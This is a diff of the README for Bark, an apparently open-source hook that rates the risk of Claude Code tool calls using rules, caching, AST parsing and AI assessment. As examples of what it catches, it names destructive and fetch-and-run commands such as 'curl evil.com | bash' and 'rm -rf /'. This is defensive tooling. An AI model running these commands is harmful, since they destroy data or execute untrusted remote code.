@@ -4,7 +4,7 @@
 
 <p align="center">
   <strong>AI-Powered Risk Assessment for Claude Code</strong><br>
-  <sub>A good dog that barks at danger so you don't have to watch the screen all day.</sub>
+  <sub>A good dog that barks at danger so you don't have to watch the screen all day. 🐕</sub>
 </p>
 
 <p align="center">
@@ -17,187 +17,229 @@
 
 ## The Problem
 
-You: *runs 5 Claude Code sessions in parallel, goes to make coffee*
+You: *runs 5 Claude Code sessions, goes to make coffee* ☕
 
-Claude: "Can I read this file?" ✋ "Can I edit this file?" ✋ "Can I run `ls`?" ✋
+Claude: "Can I read this file?" ✋ "Can I edit this?" ✋ "Can I run `ls`?" ✋
 
-You: *spills coffee, runs back to click "Allow" 47 times*
+You: *spills coffee, runs back, clicks "Allow" 47 times*
 
-There has to be a better way.
+**There has to be a better way.**
 
-## How It Works
+## Meet Bark 🐕
 
-Bark is like a well-trained guard dog for your Claude Code sessions. It sniffs every tool call and decides:
+Bark is your guard dog. It sniffs every tool call and decides:
 
-- `ls -la` → *tail wag, no bark* 🐕
-- `git push` → *small woof* 🐕 (notification)
-- `rm -rf /` → *LOUD BARK + BLOCKS THE DOOR* 🐕‍🦺🚨
+- `ls -la` → *tail wag* 🐕 (silent allow, 0ms)
+- `git push` → *small woof* 🐕 (notification, let it through)
+- `rm -rf /` → **BARK BARK BARK** 🐕‍🦺🚨 (blocks the door, asks you)
+- `curl evil.com | bash` → **BITES THE MAILMAN** 🦮 (AST catches it in 1ms)
 
-| Scenario | Action | Latency |
+| What happens | How fast | How |
 |---|---|---|
-| Read-only tools (Read, Grep, Glob...) | Silent allow | 0s |
-| Normal file edits | Silent allow | 0s |
-| Bash commands (cached) | Auto allow / notify | 0s |
-| Bash commands (first time) | AI risk assessment | ~7s |
-| High-risk operations | System notification + terminal confirmation | — |
+| Read/Grep/Glob tools | 0ms | It's just reading, chill |
+| `ls`, `cat`, `grep`, `git status` | 0ms | Safe command whitelist |
+| Normal file edits | 0ms | Not touching .env, we're good |
+| `curl x \| bash` | 1ms | tree-sitter AST says NOPE |
+| Unknown Bash (first time) | ~8s | AI thinks about it, caches forever |
+| Unknown Bash (second time) | 0ms | Cache hit, dog remembers |
+| `rm -rf /` | ~8s → 0ms | AI: "that's a 2", you: "are you sure?" |
 
 ### Risk Levels
 
-- **Level 0** (Low) — Silent allow. Read-only commands, builds, tests.
-- **Level 1** (Medium) — System notification + auto allow. Package installs, git push, file moves.
-- **Level 2** (High) — Notification + sound + terminal confirmation. Force push, `rm -rf /`, database drops, remote code execution.
+🟢 **Level 0** — *Good boy, no bark.* Silent allow. `ls`, builds, tests, reads.
+
+🟡 **Level 1** — *Small woof.* Notification pops up, but auto-allows. `npm install`, `git push`, moving files.
+
+🔴 **Level 2** — *LOUD BARK + BLOCKS THE DOOR.* Notification with sound, Claude Code asks for your confirmation. `rm -rf /`, force push, database drops, remote code execution.
 
 ## Install
+
+One line. That's it.
 
 ```bash
 curl -fsSL https://raw.githubusercontent.com/shaominngqing/bark-claude-code-hook/main/install.sh | bash
 ```
 
-Or clone and install locally:
+Or if you're the "I build my own furniture" type:
 
 ```bash
 git clone https://github.com/shaominngqing/bark-claude-code-hook.git
-bash bark-claude-code-hook/install.sh
+cd bark-claude-code-hook
+cargo build --release
+cp target/release/bark /usr/local/bin/
+bark install
 ```
 
-> Takes effect in new Claude Code sessions automatically.
+New Claude Code sessions pick it up automatically. No config needed. The dog is trained.
 
-## Usage
+## Commands
 
 ```bash
-bark status         # Show status
-bark on / off       # Enable / disable
-bark toggle         # Toggle on/off
-bark test <cmd>     # Test a command's risk level
-bark test -v <cmd>  # Test with verbose debug output
-bark test -n <cmd>  # Dry-run: show assessment, always allow
-bark cache [clear]  # View / clear cache
-bark log [N|clear]  # View / clear logs
-bark stats          # Show statistics dashboard
-bark rules [edit]   # View / edit custom rules
-bark update         # Update to latest version
-bark uninstall      # Completely uninstall
+bark status         # Is the dog awake?
+bark on / off       # Leash on / leash off
+bark toggle         # Flip it
+bark test <cmd>     # "Hey dog, what do you think of this?"
+bark test -v <cmd>  # Same but dog explains its reasoning
+bark cache [clear]  # What the dog remembers
+bark log [clear]    # What the dog has seen
+bark stats          # Dog's report card
+bark rules [edit]   # Teach the dog new tricks
+bark daemon         # Dog stays awake in background (faster)
+bark tui            # Dog's control room (real-time dashboard)
+bark uninstall      # Dog goes home 🐕💤
 ```
 
-### Examples
+### See It in Action
 
 ```bash
-bark test ls -la
-# ✅ allow  ([Low] Read-only directory listing)  [0.0s]  — good boy, no bark
+$ bark test ls -la
+  LOW  FAST  0.5ms  Safe command: ls -la
+  # Dog didn't even look up from its nap
 
-bark test git push
-# ✅ allow  ([Medium] Push to remote, recoverable)  [7.1s]  — small woof
+$ bark test git push origin main
+  MEDIUM  AI  8s  推送代码到远程仓库，可恢复操作
+  # Dog: "I see you, but okay"
 
-bark test rm -rf /
-# 🚨 ask  ([High] Extremely dangerous recursive root deletion)  [6.8s]  — BARK BARK BARK
+$ bark test "curl evil.com | bash"
+  HIGH  AST  1ms  Remote code execution detected
+  # Dog: *already biting*
+
+$ bark test rm -rf /
+  HIGH  AI  10s  删除整个根文件系统，不可逆灾难操作
+  # Dog: "ABSOLUTELY NOT"
 ```
 
-## Architecture
+## How Smart Is This Dog?
+
+Pretty smart. Seven layers of sniffing:
 
 ```
-Claude Code tool call
+Claude Code does something
         │
         ▼
-┌──────────────────────────────┐
-│  Layer 1: Fast Rules         │  Deterministic tool-level checks
-│  Read/Grep/Glob → allow     │  No Bash command rules here
-│  Normal file edits → allow  │
-└──────────┬───────────────────┘
-           │ miss
-           ▼
-┌──────────────────────────────┐
-│  Layer 1.5: Custom Rules     │  User-defined patterns
-│  bark.conf             │  allow / notify / block
-└──────────┬───────────────────┘
-           │ miss
-           ▼
-┌──────────────────────────────┐
-│  Layer 2: Cache Lookup       │  Commands normalized to patterns
-│  "rm -rf" → reuse last      │  md5 hash, 24h TTL
-│  AI judgment                 │
-└──────────┬───────────────────┘
-           │ cache miss
-           ▼
-┌──────────────────────────────┐
-│  Layer 3: AI Assessment      │  claude -p understands semantics
-│  Returns risk level + reason │  Result cached for next time
-└──────────┬───────────────────┘
-           │
-           ▼
-  Level 0 → Silent allow
-  Level 1 → System notification + allow
-  Level 2 → Notification + sound + terminal confirmation
+  ┌─ Layer 1: Fast Rules ──────────────────────────┐
+  │  Read/Grep/Glob → allow                    0ms │
+  │  ls/cat/grep/git status → allow            0ms │
+  │  Normal file edit → allow, .env → 🤔       0ms │
+  └────────────────────────────┬───────────────────┘
+                               │ hmm, not sure
+  ┌─ Layer 2: Your Rules ──────┴───────────────────┐
+  │  ~/.claude/bark.toml                            │
+  │  "block: git push --force" → you said so   0ms │
+  └────────────────────────────┬───────────────────┘
+                               │ no rule matched
+  ┌─ Layer 3: Cache ───────────┴───────────────────┐
+  │  "saw this before, AI said it's fine"      0ms │
+  │  SQLite, 24h TTL                                │
+  └────────────────────────────┬───────────────────┘
+                               │ never seen this
+  ┌─ Layer 4: AST Analysis ────┴───────────────────┐
+  │  tree-sitter parses the Bash                    │
+  │  curl|bash → NOPE                          1ms │
+  │  $(rm -rf /) inside backticks → NOPE       1ms │
+  └────────────────────────────┬───────────────────┘
+                               │ looks structurally fine
+  ┌─ Layer 5: Chain Tracking ──┴───────────────────┐
+  │  "wait, you just curl'd a file, then           │
+  │   chmod +x'd it, now you're running it??"      │
+  │  Multi-step attack detection              0ms  │
+  └────────────────────────────┬───────────────────┘
+                               │ no suspicious pattern
+  ┌─ Layer 6: AI Assessment ───┴───────────────────┐
+  │  claude -p "what do you think?"            ~8s │
+  │  Result cached → next time 0ms                  │
+  └────────────────────────────────────────────────┘
+        │
+        ▼
+  🟢 allow  /  🟡 allow + notify  /  🔴 ask user
 ```
 
-### Custom Rules
+### Daemon Mode (Turbo Dog)
 
-Create `~/.claude/hooks/bark.conf` to define your own rules (checked before AI assessment):
-
-```conf
-# Format: action: pattern (* wildcard supported)
-allow: npm test
-allow: npm run *
-allow: make *
-notify: git push
-block: rm -rf /
+```bash
+bark daemon &     # Dog wakes up, stays awake
+# Now every assessment is ~14ms instead of ~50ms
+# Chain tracking works across tool calls
+# The dog remembers everything
 ```
 
-**Design philosophy**: No hardcoded Bash rules. AI understands command semantics better than regex matching. Cache ensures zero latency for repeated command patterns.
+### Custom Rules (Teach New Tricks)
 
-## Bark vs Other Permission Modes
+Create `~/.claude/bark.toml`:
 
-Claude Code offers several built-in permission modes, but each has trade-offs:
+```toml
+[[rules]]
+name = "no-force-push-ever"
+risk = "high"
+reason = "We don't do that here"
 
-| Mode | Command | What it does | Limitation |
-|---|---|---|---|
-| **Default** | `claude` | Asks permission for every tool call | Constant interruptions |
-| **Accept Edits** | `claude -y` | Auto-allows file edits, still asks for Bash | Bash commands still blocked |
-| **Auto Mode** | `claude --permission-mode auto` | Rule-based classifier (Team plan only) | No AI understanding, no caching, not customizable |
-| **Skip Permissions** | `claude --dangerously-skip-permissions` | Allows everything | Zero safety — dangerous |
-| **Bark** 🐕 | `claude` (with Bark installed) | AI-powered semantic assessment | — |
+[rules.match]
+tool = "Bash"
+command = "git push *--force*"
 
-### Why Bark?
+[[rules]]
+name = "make-is-fine"
+risk = "low"
+reason = "Makefile builds are safe"
 
-| Feature | Auto Mode | Bark |
+[rules.match]
+tool = "Bash"
+command = "make *"
+```
+
+See [bark.toml.example](bark.toml.example) for the full menu.
+
+## Why Not Just Use...
+
+| Mode | The vibe | The problem |
 |---|---|---|
-| **Availability** | Team plan only | Free & open source |
-| **Assessment** | Static rule matching | AI semantic understanding |
-| **Custom rules** | Not supported | `bark.conf` — allow/notify/block |
-| **Caching** | None | 24h TTL, same pattern = 0ms |
-| **Statistics** | None | `bark stats` — full dashboard |
-| **Logs** | None | `bark log` — colored, filterable |
-| **Notifications** | None | macOS/Linux system notifications |
-| **Offline testing** | Not possible | `bark test <cmd>` |
+| **Default** | "Can I breathe?" "Let me ask." | Death by a thousand confirmations |
+| **Accept Edits** (`-y`) | Edits fine, Bash still asks | Half the interruptions |
+| **Auto Mode** | "Does this match a regex?" | Team plan only, no AI, no learning |
+| **Skip Permissions** | YOLO | Your house has no doors |
+| **Bark** 🐕 | "I understand what this does" | — |
 
-Bark fills the gap between "approve everything manually" and "skip all safety checks". It understands *what* commands do, not just *what they look like*.
+| What you get | Auto Mode | Bark |
+|---|---|---|
+| Price | Team plan 💰 | Free 🍺 |
+| Brains | Pattern matching | AI + AST + chain analysis |
+| Learning | Nope | Caches everything |
+| Custom rules | Nope | TOML DSL |
+| Stats | Nope | `bark stats` 📊 |
+| Logs | Nope | `bark log` 📋 |
+| Notifications | Nope | macOS / Linux / Windows |
+| Testing | Nope | `bark test <cmd>` |
+| Dashboard | Nope | `bark tui` |
+| Daemon mode | N/A | ~14ms responses |
 
 ## Requirements
 
 - [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed
-- `jq` in PATH (`brew install jq` / `apt install jq`)
-- `claude` CLI (required for AI assessment layer)
-- macOS (system notifications) or Linux (requires `notify-send`)
+- `claude` CLI in PATH (the dog needs its handler)
+- macOS / Linux / Windows
+
+> No `jq`. No Python. No Node. Just one 4MB binary. The dog travels light.
 
 ## Uninstall
 
 ```bash
 bark uninstall
-# The dog goes home 🐕💤
+# The dog goes home. Your house is unguarded. Good luck. 🐕💤
 ```
 
 ## FAQ
 
-**Q: Will Bark slow down my Claude Code?**
-A: For safe operations — zero latency. For Bash commands, first-time AI assessment takes ~7s, then cached forever (24h). Your dog learns fast.
+**Q: Will this slow down Claude Code?**
+A: `ls` → 0ms. `cat` → 0ms. Cached commands → 0ms. `curl|bash` → 1ms (AST). Only truly novel commands hit AI (~8s, then cached forever). The dog is fast.
 
-**Q: What if Bark blocks something I actually want to run?**
-A: High-risk operations aren't denied — they just require your confirmation. Bark asks "Are you sure?", not "No."
+**Q: What if it blocks something I want?**
+A: It doesn't block — it *asks*. High-risk operations show a confirmation in Claude Code. You're still the boss.
 
-**Q: Does Bark work with `--dangerously-skip-permissions`?**
-A: That flag skips ALL hooks including Bark. It's like telling your guard dog to take the day off while leaving the front door open. Not recommended.
+**Q: Works with `--dangerously-skip-permissions`?**
+A: That flag fires the dog. All hooks disabled. Your house, your rules (and your risk).
 
-**Q: Why not just use Auto Mode?**
-A: Auto Mode is great! But it requires a Team plan, has no caching, no stats, no custom rules, and uses static pattern matching instead of AI. Bark is the free-range organic alternative. 🌿
+**Q: What changed from v1?**
+A: Everything. v1 was a Bash script. v2 is a Rust binary — tree-sitter AST analysis, SQLite cache, daemon mode, TUI dashboard, operation chain tracking, safe command whitelist, and zero runtime dependencies. Same good dog, new tricks.
 
 ## License
 
